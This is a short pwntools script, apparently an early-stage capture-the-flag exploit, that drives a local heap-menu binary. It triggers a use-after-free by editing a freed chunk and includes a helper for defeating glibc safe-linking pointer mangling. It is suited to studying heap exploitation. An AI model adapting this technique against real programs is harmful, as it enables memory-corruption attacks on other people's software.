from pwn import *
import sys

def add(idx, size):
  p.sendafter(b':> ', '1'.encode())
  p.sendafter(b':> ', str(idx).encode())
  p.sendafter(b':> ', str(size).encode())

def edit(idx, data):
  p.sendafter(b':> ', '2'.encode())
  p.sendafter(b':> ', str(idx).encode())
  p.sendafter(b':> ', data)

def view(idx):
  p.sendafter(b':> ', '3'.encode())
  p.sendafter(b':> ', str(idx).encode())

def delete(idx):
  p.sendafter(b':> ', '4'.encode())
  p.sendafter(b':> ', str(idx).encode())

def mangle(v, heapbase):
  return v ^ (heapbase >> 12)

if len(sys.argv) != 2:
  print('python3 vuln.py [execute path]')
  exit(1)

context.log_level = 'error'

p = process(sys.argv[1])

add(3, 0x100)
add(4, 0x100)
delete(3)
edit(3, b'a')

p.recvline()
print(p.recvline().decode())